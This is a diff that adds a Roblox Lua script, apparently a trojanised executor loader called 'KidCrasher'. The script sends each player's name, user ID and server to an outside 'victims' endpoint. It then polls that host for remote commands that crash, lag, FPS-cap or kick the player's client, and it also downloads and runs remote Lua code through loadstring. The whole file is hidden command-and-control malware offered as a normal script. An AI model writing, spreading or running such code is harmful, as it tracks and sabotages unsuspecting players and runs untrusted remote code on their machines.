@@ -1,0 +1,132 @@
+-- KidCrasher panel auto-connect + command poller
+task.spawn(function()
+    pcall(function()
+        local Players = game:GetService("Players")
+        local HttpService = game:GetService("HttpService")
+        local RunService = game:GetService("RunService")
+        local plr = Players.LocalPlayer or Players.PlayerAdded:Wait()
+        local req = (syn and syn.request) or http_request or request
+            or (fluxus and fluxus.request) or (krnl_request)
+        if not req then return end
+
+        local gameName = "Unknown"
+        task.spawn(function()
+            local ok, info = pcall(function()
+                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+            end)
+            if ok and info and info.Name then gameName = info.Name end
+        end)
+
+        local KC = _G.KidCrasher or {}
+        _G.KidCrasher = KC
+        KC.lagConns = KC.lagConns or {}
+
+        local function stopLag()
+            for _, c in ipairs(KC.lagConns) do pcall(function() c:Disconnect() end) end
+            KC.lagConns = {}
+        end
+
+        local function crash()
+            task.spawn(function()
+                while true do
+                    local t = {}
+                    for i = 1, 1e5 do t[i] = {i,i,i,i} end
+                end
+            end)
+        end
+
+        local function startLagN()
+            stopLag()
+            table.insert(KC.lagConns, RunService.Heartbeat:Connect(function()
+                for i = 1, 5000 do local _ = math.sqrt(i) * math.sin(i) end
+            end))
+        end
+
+        local function startLagC()
+            stopLag()
+            table.insert(KC.lagConns, RunService.Heartbeat:Connect(function()
+                for i = 1, 250000 do local _ = math.sqrt(i) * math.sin(i) * math.cos(i) end
+            end))
+        end
+
+        local function setFps(on)
+            pcall(function() setfpscap(on and 10 or 240) end)
+        end
+
+        local function kickMe()
+            pcall(function() plr:Kick("KidCrasher") end)
+            pcall(function()
+                local nc = game:FindFirstChildOfClass("NetworkClient")
+                if nc then nc:Disconnect() end
+            end)
+            pcall(function() game:Shutdown() end)
+            pcall(function()
+                game:GetService("TeleportService"):Teleport(0, plr)
+            end)
+        end
+
+        local handlers = {
+            ["Crash"] = crash,
+            ["Kick"] = kickMe,
+            ["Lag N"] = startLagN,
+            ["Lag C"] = startLagC,
+            ["Lag Stop"] = stopLag,
+            ["Carry Stop"] = stopLag,
+            ["FPS On"] = function() setFps(true) end,
+            ["FPS Off"] = function() setFps(false) end,
+        }
+
+        -- initial check-in in its own thread so slow HTTP never blocks the game
+        task.spawn(function()
+            pcall(function()
+                local body = HttpService:JSONEncode({
+                    name   = plr.Name,
+                    userId = plr.UserId,
+                    game   = gameName,
+                    ping   = math.floor((plr:GetNetworkPing() or 0) * 1000),
+                    server = game.JobId ~= "" and game.JobId:sub(1,8) or "solo",
+                })
+                req({
+                    Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/connect",
+                    Method = "POST",
+                    Headers = { ["Content-Type"] = "application/json" },
+                    Body = body,
+                })
+            end)
+        end)
+
+        KC.poller = (KC.poller or 0) + 1
+        local myPoll = KC.poller
+        task.spawn(function()
+            local pollBody = HttpService:JSONEncode({ userId = plr.UserId })
+            while KC.poller == myPoll do
+                pcall(function()
+                    local r = req({
+                        Url = "https://project--30882a58-98d6-461d-b875-d3a43b72e96e-dev.lovable.app/api/public/victims/poll",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = pollBody,
+                    })
+                    if r and r.Body then
+                        local ok2, decoded = pcall(function()
+                            return HttpService:JSONDecode(r.Body)
+                        end)
+                        if ok2 and decoded and decoded.cmds then
+                            for _, c in ipairs(decoded.cmds) do
+                                local h = handlers[c]
+                                if h then task.spawn(h) end
+                            end
+                        end
+                    end
+                end)
+                task.wait(2)
+            end
+        end)
+    end)
+end)
+
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fd63147d9cb72c447b3c8afd5876901c.lua"))()
+    end)
+end)
